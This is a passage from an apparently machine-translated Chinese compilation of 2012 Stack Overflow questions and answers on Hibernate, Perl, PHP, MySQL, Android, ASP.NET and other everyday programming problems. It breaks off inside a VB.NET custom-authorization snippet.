编译未完成。您可以删除 sbt 的所有缓存，然后重新编译 Flockdb。缓存目录通常是`/root/.ivy2`，删除`.ivy2`目录。它会为你工作。

# hibernate - 鉴于 jboss-logging 不兼容，我如何使 Hibernate 4 应用程序与 JBoss 4 一起工作？

> ID：11847195
> 
> 赞同：1
> 
> 时间：2012-08-07T13:35:15.157
> 
> 标签：hibernate, logging, jboss

我正在使用 Hibernate 4.1.5.SP1，在旧的 JBoss 4.2.2 服务器上运行（无法更改我正在运行的服务器）。Hibernate 使用的 jboss-logging 类与 JBoss 4 附带的默认日志类不兼容。因此，鉴于以下 Maven (3.0.3) 依赖项，

```
 <dependency>
        <groupId>org.hibernate</groupId>
        <artifactId>hibernate-core</artifactId>
        <version>${hibernate.version}</version>
    </dependency>
    <dependency>
        <groupId>org.hibernate</groupId>
        <artifactId>hibernate-validator</artifactId>
        <version>4.2.0.Final</version>
    </dependency>
    <dependency>
        <groupId>org.hibernate.javax.persistence</groupId>
        <artifactId>hibernate-jpa-2.0-api</artifactId>
        <version>1.0.1.Final</version>
    </dependency>
    <dependency>
        <groupId>org.hibernate</groupId>
        <artifactId>hibernate-entitymanager</artifactId>
        <version>${hibernate.version}</version>
    </dependency> 
```

我收到以下运行时错误...</p>

```
javax.ejb.EJBTransactionRolledbackException: java.lang.NoSuchMethodError: org.jboss.logging.Logger.getMessageLogger(Ljava/lang/Class;Ljava/lang/    String;)Ljava/lang/Object;  
        at org.jboss.ejb3.tx.Ejb3TxPolicy.handleInCallerTx(Ejb3TxPolicy.java:87)  
        at org.jboss.aspects.tx.TxPolicy.invokeInCallerTx(TxPolicy.java:130)  
        at org.jboss.aspects.tx.TxInterceptor$Required.invoke(TxInterceptor.java:195)  
        at org.jboss.aop.joinpoint.MethodInvocation.invokeNext(MethodInvocation.java:101)  
        at org.jboss.ejb3.stateless.StatelessInstanceInterceptor.invoke(StatelessInstanceInterceptor.java:62)  
        at org.jboss.aop.joinpoint.MethodInvocation.invokeNext(MethodInvocation.java:101)  
        at org.jboss.ejb3.mdb.MessagingContainer.localInvoke(MessagingContainer.java:249)  
        at org.jboss.ejb3.mdb.inflow.MessageInflowLocalProxy.delivery(MessageInflowLocalProxy.java:268)  
        at org.jboss.ejb3.mdb.inflow.MessageInflowLocalProxy.invoke(MessageInflowLocalProxy.java:138)  
        at $Proxy121.execute(Unknown Source)  
        at org.jboss.resource.adapter.quartz.inflow.QuartzJob.execute(QuartzJob.java:57)  
        at org.quartz.core.JobRunShell.run(JobRunShell.java:203)  
        at org.quartz.simpl.SimpleThreadPool$WorkerThread.run(SimpleThreadPool.java:520)  
Caused by: java.lang.RuntimeException: java.lang.NoSuchMethodError: org.jboss.logging.Logger.getMessageLogger(Ljava/lang/Class;Ljava/lang/String;)Ljava/    lang/Object;  
        at org.jboss.ejb3.interceptor.InvocationContextImpl.proceed(InvocationContextImpl.java:174)  
        at org.jboss.ejb3.interceptor.EJB3InterceptorsInterceptor.invoke(EJB3InterceptorsInterceptor.java:63)  
        at org.jboss.aop.joinpoint.MethodInvocation.invokeNext(MethodInvocation.java:101)  
        at org.jboss.ejb3.entity.TransactionScopedEntityManagerInterceptor.invoke(TransactionScopedEntityManagerInterceptor.java:54)  
        at org.jboss.aop.joinpoint.MethodInvocation.invokeNext(MethodInvocation.java:101)  
        at org.jboss.ejb3.AllowedOperationsInterceptor.invoke(AllowedOperationsInterceptor.java:47)  
        at org.jboss.aop.joinpoint.MethodInvocation.invokeNext(MethodInvocation.java:101)  
        at org.jboss.aspects.tx.TxPolicy.invokeInCallerTx(TxPolicy.java:126)  
        ... 11 more  
    Caused by: java.lang.NoSuchMethodError: org.jboss.logging.Logger.getMessageLogger(Ljava/lang/Class;Ljava/lang/String;)Ljava/lang/Object;  
        at org.hibernate.cfg.beanvalidation.BeanValidationIntegrator.<clinit>(BeanValidationIntegrator.java:53)  
        at org.hibernate.integrator.internal.IntegratorServiceImpl.<init>(IntegratorServiceImpl.java:46)  
        at org.hibernate.service.internal.BootstrapServiceRegistryImpl.<init>(BootstrapServiceRegistryImpl.java:80)  
        at org.hibernate.service.internal.BootstrapServiceRegistryImpl.<init>(BootstrapServiceRegistryImpl.java:57)  
        at org.hibernate.service.ServiceRegistryBuilder.<init>(ServiceRegistryBuilder.java:76)  
        at org.mainco.subco.dido.service.AbstractServiceProvider.getSessionFactory(AbstractServiceProvider.java:67)  
        at org.mainco.subco.dido.service.AbstractServiceProvider.initServices(AbstractServiceProvider.java:118)  
        at org.mainco.subco.dido.quartz.ProcessOrdersJob.execute(ProcessOrdersJob.java:79)  
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)  
        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)  
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)  
        at java.lang.reflect.Method.invoke(Method.java:597)  
        at org.jboss.aop.joinpoint.MethodInvocation.invokeNext(MethodInvocation.java:112)  
        at org.jboss.ejb3.interceptor.InvocationContextImpl.proceed(InvocationContextImpl.java:166 
```

任何人都知道如何重新配置​​我的 Hibernate 4 日志记录设置以与这个旧服务器兼容？谢谢， - 戴夫

# html - 如何在 HTML5 中对齐表格单元格？

> ID：11847200
> 
> 赞同：2
> 
> 时间：2012-08-07T13:35:39.817
> 
> 标签：html

html5 似乎不支持属性 valign 和 align 。现在如何在 html5 中使用表格单元格来做到这一点？

```
<td valign="top" colspan="2" style="height:50px;" > hello world </td> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-07T13:36:48.333

用 css:`vertical-align`和`text-align`分别。

# perl - Perl：在目录中查找文件并将其分配给变量

> ID：11847201
> 
> 赞同：1
> 
> 时间：2012-08-07T13:35:47.940
> 
> 标签：perl, file, directory, user-input

我正在尝试开发一个 perl 脚本，该脚本在用户的**所有**目录中查找特定文件名，而无需用户指定文件的整个路径名。

例如，假设感兴趣的文件是`focus.qseq`. 它位于`/home/path/directory/`. 在命令行中，通常用户必须指定文件的路径名才能访问它，如下所示：`/home/path/directory/focus.qseq`.

相反，我希望用户只需`sample.qseq`在命令行中输入，然后 perl 脚本会自动将正确的文件分配给变量。如果文件是重复的但在不同的目录中，那么终端将显示这些文件的完整路径名，用户可以更好地指定他们想要的文件。

我阅读了有关[File::Find](http://perldoc.perl.org/File/Find.html#DESCRIPTION)模块的信息，但它并没有完全满足我的要求。

这是我实现上述代码的最佳尝试：

```
#!/usr/bin/perl
use strict; use warnings;
use File::Find;

my $file = shift;

# I want to search from the top down (you know, recursively) so first I look in the home directory
# I believe $ENV{HOME} is the same as $~/home/user
find(\&wanted, @$ENV{HOME}); 
open (FILEIN, $file) or die "couldn't open $file for read: $!\n"; 
```

我真的不明白`wanted`子程序在这个模块中是如何工作的。如果有人知道实现我上面描述的代码的另一种方法，请随时提出建议。谢谢你

编辑：如果我想使用命令行选项怎么办。像这样：

```
#!/usr/bin/perl
use strict; use warnings;
use File::Find;
use Getopt::Long qw(GetOptions);

my $file = '';
GetOptions('filename|f=s' => \$file);

# I believe $ENV{HOME} is the same as $~/home/user
find(\&wanted, @$ENV{HOME});
open (FILEIN, $file) or die "couldn't open $file for read: $!\n"; 
```

这个实施如何？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-07T13:40:08.210

File::Find 应该没问题。

你可以像这样循环遍历所有内容

```
find( sub {
    say $File::Find::name if ($_ eq $userInput);
}, '/'); 
```

那应该做你想做的事。不要忘记`chomp`用户输入，除非它通过`@ARGV`

将 更改为`'/'`您要搜索的任何目录，或者您也可以让用户指定。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-07T13:58:16.880

一个问题是您尝试在未指定路径的情况下打开文件。您需要创建另一个变量，例如`$path`. 现在，您可以`\&wanted`作为对在别处编写的子例程的引用传递，但您可能不得不求助于全局变量。使用闭包会更好。

您的代码可能如下所示：

```
#!/usr/bin/perl
use strict; use warnings;
use File::Find;
use Getopt::Long qw(GetOptions);

my ($file, $path);
GetOptions('filename|f=s' => \$file);

# Set $path when file is found.
my $wanted = sub { $path = $File::Find::name if ($_ eq $file); };

find($wanted, $ENV{HOME});
if (!$path) {
    # complain
}
open (FILEIN, $path) or die "couldn't open $file for read: $!\n"; 
```

# key-bindings - 在 Sublime Text 2 的键绑定文件中获取文件路径 + 文件名

> ID：11847204
> 
> 赞同：3
> 
> 时间：2012-08-07T13:35:56.067
> 
> 标签：key-bindings, sublimetext, sublimetext2

我正在尝试在 Sublime Text 2 的键绑定文件中获取当前文件的路径 + 文件名（不带扩展名）。`$file_path`或者`${file_path}`两者都不起作用。

原因是我想执行一个之前构建的 *.exe 文件（但不想一步构建和执行）。有任何想法吗？

格雷茨

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-05T12:20:35.787

你可以试试[sublime-snippet](http://sublimetext.info/docs/en/extensibility/snippets.html)，这是我的代码：

```
#filename: filename.sublime-snippet
<snippet>
    <content><![CDATA[$TM_FILENAME]]></content>
    <!-- Optional: Tab trigger to activate the snippet -->
    <tabTrigger>fn</tabTrigger>
    <!-- Optional: Scope the tab trigger will be active in -->
    <scope>source.python</scope>
    <!-- Optional: Description to show in the menu -->
    <description>the current file name</description>
</snippet> 
```

当你在 python 源文件中输入“fn”时，你会得到你的文件名。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-04-06T15:14:49.903

Sublime 提供了一个名为的命令`copy_path`，它将当前文件的绝对路径复制到剪贴板。不幸的是，这包括文件扩展名。但是，如果您熟悉如何推出自己的快速插件，则可以在`copy_path`其中发布，并执行一些基本的字符串操作以去除文件扩展名。如果不是，您可以绑定`copy_path`到组合键并从那里开始工作。

# python - 用 python 和 bs 解析 HTML

> ID：11847205
> 
> 赞同：1
> 
> 时间：2012-08-07T13:35:58.103
> 
> 标签：python, html-parsing

我需要获取所有 Android 设备的列表，并且为了做到这一点而无需从 Android.com 复制/粘贴每个项目，我认为 Python 脚本会更轻松地完成这项工作。问题是我三天前才开始学习python。

现在，这是我要解析并仅提取`<a>`每个属性的字符串的 HTML 结构`<li>`。

```
<html>
    <head>
    <body>
        <div id="header">
        <div class="main">
            <div class="listing">
                <form id="listing" class="">
                    <ul>
                        <li>
                            <p>
                                <a class="title" href="/devices/detail/xperia-p">Xperia™ P</a>
                            </p>
                        </li> 
```

这是我使用的python脚本：

```
Python 2.7.1 (r271:86832, Jun 16 2011, 16:59:05) 
import requests
from bs4 import BeautifulSoup
session = requests.session()
req = session.get('http://www.android.com/devices/?country=all&f=phone')
soup = BeautifulSoup(req.content)
print soup.findAll("a", "title") 
```

显然在这个设置中我得到了所有的`<a>`标签，而不仅仅是字符串。我知道我可以使用该`text`参数，但我不知道如何与 CSS 选择器一起使用。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-07T13:39:04.650

```
for a in soup.findAll("a", "title"):
    print a.get_text() 
```

[http://www.crummy.com/software/BeautifulSoup/bs4/doc/#get-text](http://www.crummy.com/software/BeautifulSoup/bs4/doc/#get-text)

* * *

## 回答 #2

> 赞同：-3
> 
> 时间：2012-08-07T13:40:42.887

尝试使用 XML 解析器，例如 [xml.dom.minidom](http://docs.python.org/library/xml.dom.minidom.html)。

我不记得语法，但它很容易使用。

# version-control - teamcity中mercurial VCS的证书验证失败

> ID：11847213
> 
> 赞同：3
> 
> 时间：2012-08-07T13:36:22.530
> 
> 标签：version-control, mercurial, certificate, teamcity

我正在尝试使用 teamcity 配置 mercurial，但出现以下错误：

标准错误：中止：错误：_ssl.c:504：错误：14090086：SSL 例程：SSL3_GET_SERVER_CERTIFICATE：证书验证失败

尝试了以下签名证书链接中提到的解决方案，但似乎没有任何效果。

[https://www.mercurial-scm.org/wiki/CACertificates#Manually_bypassing_security_checks_on_self-signed_certificates](https://www.mercurial-scm.org/wiki/CACertificates#Manually_bypassing_security_checks_on_self-signed_certificates)

任何想法我在这里缺少什么。请指导

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-13T12:56:20.883

通过将 mercurial.ini 配置文件放在 C:\Windows\System32\config\systemprofile 路径来解决问题。

# vba - 增加 Outlook AppointmentItem 的 StartTime 属性的方法

> ID：11847217
> 
> 赞同：0
> 
> 时间：2012-08-07T13:36:37.367
> 
> 标签：vba, outlook, increment

我正在尝试为 Outlook 2010 编写一个 VBA 宏，以编程方式将 StartTime 属性增加几个小时（以抵消某些约会转向 UTC 时区的安装后问题）。定期约会的时区属性被证明几乎不可能修复，所以我认为只是增加时间（定期约会的 RecurrencePattern 的 StarTime 属性）将是一个更容易修复。由于它不是整数，我无法弄清楚/找到任何方法来简单地将它增加一定数量。到目前为止，我发现的所有文档都只是关于将属性更改为特定日期。我非常感谢任何帮助，谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-07T16:20:26.087

MS 应用程序中的日期值是一个整数，表示自 1980 年 1 月以来的天数（窗口），一个小数表示当天的一个点。

所以 2012 年 8 月 8 日凌晨 2:54:12 类似于 41129.1209722222

添加一天只是上面的数字+ 1 = 41130.1209722222（简单）

要计算秒、分钟和小时，您需要计算出小数点代表您想要添加（或减去）的时间

一小时用十进制 0.0416666 表示（1 除以 24）

一分钟是一天 1440 分钟的 0.00069444（1 除以 24 除以 60）。

增加 20 分钟 41129.1209722222 + 0.01388888

# share - 如何在不打开共享对话框的情况下在 Google+ 中共享

> ID：11847220
> 
> 赞同：1
> 
> 时间：2012-08-07T13:36:39.737
> 
> 标签：share, google-plus, oneclick

我将开发一个扩展来共享页面的选定部分，只需单击页面中显示的共享图像。如何在不打开共享对话框的情况下在 google plus 中共享文本或图像？有什么办法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-07T17:18:15.217

在 Google+ 上分享的唯一方法是通过分享对话框。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-09T18:38:58.520

谷歌表示，他们希望分享是蓄意的行为——他们不希望网页或其他系统能够“代表你”发布任何内容，而无需用户采取特定的肯定行动。

简而言之，他们不想要 Facebook 的“无摩擦分享”。

他们开始推出让网站自动将“时刻”发布到历史库的功能，但用户仍需要采取特定操作才能将这些时刻发布到他们的信息流中。有关更多信息和开发者预览，请参阅[https://developers.google.com/+/history/](https://developers.google.com/+/history/)。

# java - HTTP POST 不工作。Getting Not Found 错误

> ID：11847221
> 
> 赞同：0
> 
> 时间：2012-08-07T13:36:42.047
> 
> 标签：java

我正在尝试将 .txt 文件发布到我系统上的本地 tomcat 网络服务器。但是当我尝试发帖时，我得到一个错误：未找到。源文件存在，但即使在此之后我也收到此错误。你能告诉我我在这里做错了什么吗？我在下面粘贴了我的代码。

```
 File file = new File("C:\\xyz\\test.txt");    
    URL url = new URL("http://localhost:8080/process/files");    
    urlconnection = (HttpURLConnection) url.openConnection();     
    urlconnection.setDoOutput(true);    
    urlconnection.setDoInput(true);
    urlconnection.setRequestMethod("POST"); 

    BufferedOutputStream bos = new BufferedOutputStream(urlconnection.getOutputStream());
    BufferedInputStream bis = new BufferedInputStream(new FileInputStream(file));
    int i;     // read byte by byte until end of stream     
    while ((i = bis.read()) >0) {
        bos.write(i);     
        }
    bos.close();

    System.out.println(((HttpURLConnection)urlconnection).getResponseMessage());
    } catch(Exception ae)
    {
        ae.printStackTrace();
    }
    try {
        InputStream inputStream;
                int responseCode=((HttpURLConnection)urlconnection).getResponseCode();    
                if ((responseCode>= 200) &&(responseCode<=202) ) {
                    inputStream = ((HttpURLConnection)urlconnection).getInputStream();     
                    int j;     
                    while ((j = inputStream.read()) >0) {
                        System.out.println("------ TESTING ------");     
                        }     
                    } else {
                        inputStream = ((HttpURLConnection)urlconnection).getErrorStream();
                        }
                ((HttpURLConnection)urlconnection).disconnect();
            } catch (IOException e) {    // TODO Auto-generated catch block
                            e.printStackTrace();
        }
    } 
```

你能告诉我这里出了什么问题吗？我已经为此挠头了很长时间。

谢谢维肯

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-07T18:34:12.570

您发布到的 URL 需要指向一个 servlet 或类似的东西。您不能仅通过发送 POST 请求将文件上传到目录 - POST 请求必须由某些东西处理。

# symfony - Symfony 服务设置 NULL 数据

> ID：11847231
> 
> 赞同：0
> 
> 时间：2012-08-07T13:37:19.660
> 
> 标签：symfony

我在 Symfony 2.0 中创建服务时遇到了几个问题，但我找到了除服务设置空数据之外的所有问题的解决方法。

```
public function logAction($request, $entityManager)
{
    $logs = new Logs();
    $logs->setRoute = $request->get('_route');
    $logs->setController = $request->get('_controller');
    $logs->setRequest = json_encode($request->attributes->all());
    $logs->setPath = $request->server->get('PATH_INFO');
    $logs->setIp = $request->server->get('REMOTE_ADDR');

    $em = $entityManager;
    $em->persist($logs);
    $em->flush();
} 
```

我在另一个控制器中调用服务时传递了 EntityManager，我将发布该代码以防万一：

```
public function pageAction($id = null, Request $request)
{
    $log = $this->get('logging');
    $log->logAction($request, $this->getDoctrine()->getEntityManager());

    return $this->render('AcmeDemoBundle:Demo:viewPage.html.twig', array('name' => $id));
} 
```

我按照官方文档（在日志包中）创建了一个 services.yml 文件，并插入了一个实际行，但所有字段都设置为 NULL。如果我尝试在实体文件中的一个二传手中做一个死，它不会死，所以似乎有些东西没有成功。（在有人询问之前，我在日志服务文件的顶部同时使用了 EntityManager 和 Entity 文件）

任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-07T14:22:49.453

```
$logs->setRoute = $request->get('_route'); 
```

应该：

```
$logs->setRoute($request->get('_route')); 
```

对于 D2，所有访问器都需要是方法。

# php - 使用 PHP 的 SOAP 请求

> ID：11847233
> 
> 赞同：1
> 
> 时间：2012-08-07T13:37:31.590
> 
> 标签：php, soap, wsdl

有一个具有很多功能的 Web 服务 (WSDL)。我想用 PHP 调用这些函数之一。该网络服务提供了一个文档，其中他们放置了一个包含标头和 xml 的格式，但我不知道我需要如何从 PHP 发送请求。我现在搜索了几个小时，我根本不知道。

他们提供的示例请求：

```
POST POSTURL HTTP/1.1
Host: HOST
Content-Type: text/xml; charset=utf-8
Content-Length: length
SOAPAction: "SOAPLOCATION"

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <Version xmlns="URL" />
  </soap:Body>
</soap:Envelope> 
```

我应该收到的响应也给出了，但我什至无法发送请求。

如何使用 PHP 发送请求以获取响应？我尝试了一些 PHP SoapClient 的东西，但我找不到易于阅读的教程或一些清晰的解释......

如果有人可以帮助我，那就太好了！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-07T14:48:21.100

映射一些典型信息可能看起来像这样。

```
 $data = array(
        'UserName'  => $user->getUsername(),
        'Password'  => $user->getPassword(),
        'Email'     => $user->getEmail(),
        'FirstName' => $user->getFirstName(),
        'LastName'  => $user->getLastName(),
    );

    $response = $this->getDatasource()->TheServiceMethodForCreatingAUser(
        array(
             'user' => $data
        )
    ); 
```

然后根据您的意愿处理响应（通过某些描述的实体或响应对象）。标头必须使用 new SoapHeader() 单独完成。

希望这可以帮助。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-09T08:09:45.323

我对这个问题有一个补充：

请求如下：

```
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" xmlns="...">
   <s:Body>
      <Search>
         <login>
            <Wholesaler>...</Wholesaler>
            <Username>...</Username>
            <Password>...</Password>
         </login>
         <itemRequests>
            <ItemRequest>
               <ArticleId>int</ArticleId>
               <SupplierId>int</SupplierId>
               <QuantityRequested>int</QuantityRequested>
            </ItemRequest>
         </itemRequests>
      </Search>
   </s:Body>
</s:Envelope> 
```

我需要发送两个 SoapHeaders：

```
Content-Type: text/xml; charset=utf-8
SOAPAction: URI 
```

我确实知道服务提供商和操作标识符。

如果我有以下变量

```
$service
$action
$request
$header 
```

如何在 PHP 中发送请求？我试过了

```
$client  = new SoapClient($service);
$result = $client->__doRequest($request, $service, $action); 
```

但我似乎没有收到回复...

这就是响应应该是这样的：

```
Date: Thu, 09 Aug 2012 08:01:40 GMT
Server: Microsoft-IIS/6.0
X-Powered-By: ASP.NET
X-AspNet-Version: 4.0.30319
Content-Length: 408
Cache-Control: private
Content-Type: text/xml; charset=utf-8

<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">
  <s:Body xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
    <SearchResponse xmlns="...">
      <SearchResult>
        <Wholesaler>...</Wholesaler>
        <Username>...</Username>
        <Error>false</Error>
        <DateTime>2012-08-09T10:01:40.39125+02:00</DateTime>
        <ItemResults />
      </SearchResult>
    </SearchResponse>
  </s:Body>
</s:Envelope> 
```

当我做一个简单的 echo $result 时，屏幕保持白色，并且在代码中没有可见的 XML。

# php - PHP脚本不能在本地计算机上运行， 但可以在网络服务器上运行

> ID：11847235
> 
> 赞同：0
> 
> 时间：2012-08-07T13:37:39.097
> 
> 标签：php, mysql, configuration

我是 php 编码的新手，并且还在我的本地计算机上设置了环境。

这是当前的设置配置 - 我已经安装了 wamp 服务器版本 2.2，它具有以下内容 - Apache 2.4.2、php 5.4.3、mysql 5.5.24

我写了一个非常简单的php代码-

```
<?
mysql_connect("localhost","user","password");
mysql_select_db("mydbase");
$result = mysql_query("SELECT * FROM names WHERE ID LIKE '2'"); 
   while($r=mysql_fetch_array($result))
{
$id = $r["id"];
$name = $r["name"];

}//close while
?> 
```

即使是简单的回声也不起作用。输出为空白。相同的代码适用于 Web 服务器。它具有相同的用户名、密码，并且表被导出（从网络服务器）和导入（到本地 mysql）。

**phpinfo() 页面显示以下内容**-

display_errors - on - on error_log - 无值 - 无值

**php.ini 文件显示以下**- ; 显示错误；默认值：开；开发价值：开；产值：关闭和

```
;error_log = php_errors.log
; Log errors to syslog (Event Log on NT, not valid in Windows 95).
;error_log = syslog
error_log = c:/wamp/logs/php_error.log 
```

**错误日志为空。**

当我在浏览器中查看源代码时，对于在线页面 - 它显示本地计算机上页面的输出 - 它只显示 php 代码

谁能让我知道问题可能是什么？似乎有些设置我搞砸了。但是，我没有更改任何内容 - 这是常规安装，没有添加任何自定义设置。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-07T15:06:27.700

你的脚本不工作，但你的 phpinfo 页面工作？检查 php.ini 中的 short_open_tag。或者修改您的脚本并将您的开头更改`<?`为`<?php`. 如果可行，您就发现了问题！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-07T14:04:05.177

如果，在 info.php 文件创建时使用

```
<?php phpinfo(); ?> 
```

你实际上得到了这个结果，检查你的网络服务器是否配置为使用 php 作为脚本文件：

在 httpd.conf 中检查这些行并在必要时更改它们：

```
<IfModule dir_module>
    DirectoryIndex index.html index.php
</IfModule> 
```

重新启动服务器并尝试再次运行脚本。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-07T13:51:53.287

这也发生在我身上，尝试启用 apache 的 mime_module

# mysql - MySQL if then 子句

> ID：11847243
> 
> 赞同：0
> 
> 时间：2012-08-07T13:38:12.000
> 
> 标签：mysql, if-statement, sum

我总结了两个表中两列的行，例如：

```
SUM( tableA.age ) + sum( tableB.age) as 'Total Ages' 
```

但在某些情况下，表 A 的结果为空，而表 B 的结果不是。在这种情况下，我得到的总结果为 null，尽管它类似于“NULL + 45”，实际上不是 null。因此，我认为使用 sql 语法的 if 子句是个好主意。但它不起作用我在尝试执行以下操作时遇到错误：

```
IF SUM( tableA.age ) IS NULL THEN 0 ELSE  SUM( tableA.age ) END IF + IF SUM( tableB.age ) IS NULL THEN 0 ELSE  SUM( tableB.age ) END IF 
```

我将如何以适当的方式做到这一点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-07T13:41:25.993

使用代替复杂（且语法不正确）的`IF`语句，[`COALESCE()`](http://dev.mysql.com/doc/refman/5.0/en/comparison-operators.html#function_coalesce)它返回其第一个非空参数，并指定 0 作为其第二个参数，因此当聚合`SUM()`为空时默认为零

```
COALESCE(SUM(tableA.age), 0) + COALESCE(SUM(tableB.age), 0) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-07T14:00:39.123

`IFNULL()`当您认为该字段具有`NULL`价值时，只需使用即可。

```
 SUM(IFNULL(tableA.age,0) ) 
```

您可以使用此`MYSQL`功能。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-07T13:42:22.307

用于`IFNULL(column, 0)`将列值转换为零：

```
SUM( IFNULL(tableA.age,0) ) + SUM( IFNULL(tableB.age,0) ) as 'Total Ages' 
```

# java - Android 样式和主题

> ID：11847250
> 
> 赞同：2
> 
> 时间：2012-08-07T13:38:28.833
> 
> 标签：java, android, android-layout, android-ui

我创建简单的`style.xml`文件

```
<style name="You.EditText.Style" parent="@android:style/Widget.EditText">
    <item name="android:textColor">@color/colorRed</item>
    <item name="android:gravity">center</item>
</style> 
```

但是`EditText`我动态创建的所有内容。我如何将我的风格声明为`EditText`属性？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-07T13:52:02.217

像这样实例化您的`EditText`视图：

```
EditText e = new EditText(context, null, R.style.You_EditText_Style); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-07T13:43:13.527

您可以使用 EditText#setTextAppearance(context, resid) 方法执行此操作。

例子：

```
myEditText.setTextAppearance(getApplicationContext(), R.style.id); 
```

请参阅[EditText 参考](http://developer.android.com/reference/android/widget/TextView.html#setTextAppearance%28android.content.Context,%20int%29)。

# c# - 漂亮、对设计师友好的 GUI 库

> ID：11847255
> 
> 赞同：1
> 
> 时间：2012-08-07T13:38:41.517
> 
> 标签：c#, java, swing, user-interface, gtk

我正在考虑下一个项目使用哪种技术，而现在决定它的主要是 GUI 库。最好它具有 C# 和 Java 的绑定。

这将适用于游戏关卡设计师，如果有像[Unity](http://www.sutublog.com/wp-content/uploads/2011/04/unity-3D.jpg)那样的深色皮肤，或者像最新的[Adob​​e](http://screenshots.en.sftcdn.net/en/scrn/3340000/3340167/adobe-photoshop-02-700x464.jpg)产品，甚至像 Blender 或 Sublime Text 2 这样，那就太好了。

至于技术要求，如果它允许 Docking 那就太好了，但如果不允许，我可能会硬编码其中的一部分。我已经为 java Swing 外观或 GTK# 寻找​​了很多东西，但我找不到任何视觉上真正有趣的东西。

有没有这样的图书馆/主题？谢谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-08T14:55:19.580

最新版本的 GTK+ 通过 CSS 文件改进了主题支持。它比以往任何时候都更加灵活。The GNOME Journal 上有[介绍。](http://gnomejournal.org/article/107/styling-gtk-with-css)

此外，Java 和 Mono 都有[GObject Introspection](https://live.gnome.org/GObjectIntrospection/Users)。这意味着如果库支持 GObject Introspection，您可以获得很多开箱即用的绑定。它是**最好**的。

事实上，Unity、Blender 甚至 Sublime Text 都是用 GTK+ 编写的！试一试，感受一下！

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-07T14:46:29.290

好像我找到了一个不错的，[https://vaadin.com/](https://vaadin.com/)（带有黑色主题，[http://demo.vaadin.com/ReindeerTheme](http://demo.vaadin.com/ReindeerTheme)）虽然它不支持对接元素，但它的优点是支持GWT和JS输出！

不过，仍在寻找更好的替代品！

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-08-07T13:51:05.047

您可以使用 Java Swing 做很多事情。[blueMarine](http://netbeans.org/community/magazine/html/03/bluemarine/)就是一个例子，这是一个使用 NetBeans 平台（使用 Swing）编写的照片管理应用程序。（我不确定 blueMarine 是否仍然可用 - 该[网站](http://bluemarine.tidalwave.it/)似乎无法正常工作）。

例如，参见《[肮脏的富客户](http://filthyrichclients.org/)》一书。

# asp.net - Loginview 模板 - 会员链接

> ID：11847256
> 
> 赞同：0
> 
> 时间：2012-08-07T13:38:50.240
> 
> 标签：asp.net, visual-studio-2010, vwdexpress

我在这里阅读指南[http://msdn.microsoft.com/en-us/library/879kf95c.aspx](http://msdn.microsoft.com/en-us/library/879kf95c.aspx)。

在创建登录视图后的部分中，它会说明。

```
 you would probably put the members-only page link in the logged-in template of the 
 LoginView control. That way, visitors to your site would not see the link until 
 they are logged in. 
```

该指南不包含有关您可以在哪里找到如何执行此操作的链接。我正在搜索谷歌，但找不到显示此内容的指南。

任何人都可以就菜单项仅在用户登录时显示的确切方式提供建议吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-07T13:41:56.553

看看这些文章：

[ASP.NET 登录控件概述](http://msdn.microsoft.com/en-us/library/ms178329.aspx)

[登录视图类](http://msdn.microsoft.com/en-us/library/system.web.ui.webcontrols.loginview.aspx)

# asp.net-mvc - 在 CustomAuthorize AuthorizeAttribute 中未处理 StackOverFlowException

> ID：11847262
> 
> 赞同：0
> 
> 时间：2012-08-07T13:39:06.597
> 
> 标签：asp.net-mvc, vb.net, asp.net-mvc-3, entity-framework

我有一个名为 CustomAuthorize 的自定义授权程序，它继承了 AuthorizeAttribute，它只是根据特定于用户的各种因素来限制对某些控制器和资源的访问。但是，我在以下行中收到错误：

该行：

> Protected Overrides Function AuthorizeCore(httpContext As HttpContextBase) As Boolean

错误：

> MyBlog.DLL 中出现“System.StackOverflowException”类型的未处理异常

这是我的整个代码：

公共类 CustomAuthorize 继承 AuthorizeAttribute

```
Protected Overrides Function AuthorizeCore(httpContext As HttpContextBase) As Boolean

    Dim authorized = AuthorizeCore(httpContext)

    ' if user is not authorized, restrict access
    If (authorized = False) Then

        Return False

    End If

    ' get user name
    Dim username = httpContext.User.Identity.Name

    ' get user
    Dim user = Membership.GetUser(username, True)

    ' get user's profile
